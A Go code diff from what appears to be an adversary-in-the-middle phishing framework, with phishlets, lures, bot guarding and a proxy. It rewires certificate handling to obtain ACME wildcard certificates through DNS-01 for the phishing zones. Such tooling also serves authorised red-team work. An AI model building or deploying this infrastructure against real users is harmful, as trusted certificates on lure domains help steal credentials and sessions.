@@ -42,7 +42,7 @@ type Daemon struct {
 	dnsService        *aitm.DNSService
 	watcher           *phishlet.Watcher
 	phishletReloadSub <-chan aitm.Event
-	certSource        *cert.SelfSignedCertSource
+	certSource        aitm.CertSource
 
 	// Proxy.
 	proxy *proxy.AITMProxy
@@ -59,12 +59,12 @@ type Daemon struct {
 type initializer struct {
 	*Daemon
 
-	lureStore    *sqlite.Lures
+	lureStore     *sqlite.Lures
 	phishletStore *sqlite.Phishlets
-	resolver     *aitm.PhishletResolver
-	zones        map[string]aitm.ZoneConfig
-	certSource   *cert.SelfSignedCertSource
-	botStore     *sqlite.Bots
+	resolver      *aitm.PhishletResolver
+	zones         map[string]aitm.ZoneConfig
+	dnsProviders  map[string]aitm.DNSProvider
+	botStore      *sqlite.Bots
 	botGuardSvc  *aitm.BotGuardService
 	sessionStore aitm.SessionStore
 	lureSvc      *aitm.LureService
@@ -75,7 +75,7 @@ type initializer struct {
 
 // New constructs and fully wires a Daemon. Returns an error if any
 // subsystem fails to initialise — no partial startup.
-func New(configPath string, selfSigned bool, version string, logger *slog.Logger) (*Daemon, error) {
+func New(configPath string, version string, logger *slog.Logger) (*Daemon, error) {
 	cfg, err := loadConfig(configPath)
 	if err != nil {
 		return nil, err
@@ -99,7 +99,7 @@ func New(configPath string, selfSigned bool, version string, logger *slog.Logger
 	if err := ini.initDNS(); err != nil {
 		return nil, err
 	}
-	if err := ini.initCerts(selfSigned); err != nil {
+	if err := ini.initCerts(); err != nil {
 		return nil, err
 	}
 	if err := ini.initServices(); err != nil {
@@ -175,22 +175,36 @@ func (ini *initializer) initDNS() error {
 	if err != nil {
 		return fmt.Errorf("initializing DNS providers: %w", err)
 	}
+	ini.dnsProviders = providers
 	ini.dnsService = aitm.NewDNSService(providers, ini.zones, ini.bus)
 
 	return nil
 }
 
-func (ini *initializer) initCerts(selfSigned bool) error {
-	caDir := filepath.Join(filepath.Dir(ini.cfg.DBPath), "ca")
+func (ini *initializer) initCerts() error {
+	dataDir := filepath.Dir(ini.cfg.DBPath)
 
-	src, err := cert.NewSource(selfSigned, caDir, ini.logger)
+	// Build per-zone provider map for wildcard DNS-01 ACME.
+	zonedProviders := make(map[string]aitm.DNSProvider)
+	for baseDomain, zone := range ini.zones {
+		if p, ok := ini.dnsProviders[zone.ProviderName]; ok {
+			zonedProviders[baseDomain] = p
+		}
+	}
+
+	src, err := cert.NewSource(cert.SourceConfig{
+		SelfSigned:     ini.cfg.SelfSigned,
+		CADir:          filepath.Join(dataDir, "ca"),
+		CertFileDir:    filepath.Join(dataDir, "certs"),
+		ACMEEmail:        ini.cfg.ACME.Email,
+		ACMEDirectoryURL: ini.cfg.ACME.DirectoryURL,
+		ACMEStorageDir: filepath.Join(dataDir, "acme"),
+		Providers:      zonedProviders,
+	}, ini.logger)
 	if err != nil {
 		return err
 	}
-	if err := src.EnsureCA(); err != nil {
-		return fmt.Errorf("initializing CA: %w", err)
-	}
-	ini.certSource = src
+
 	ini.Daemon.certSource = src
 
 	return nil
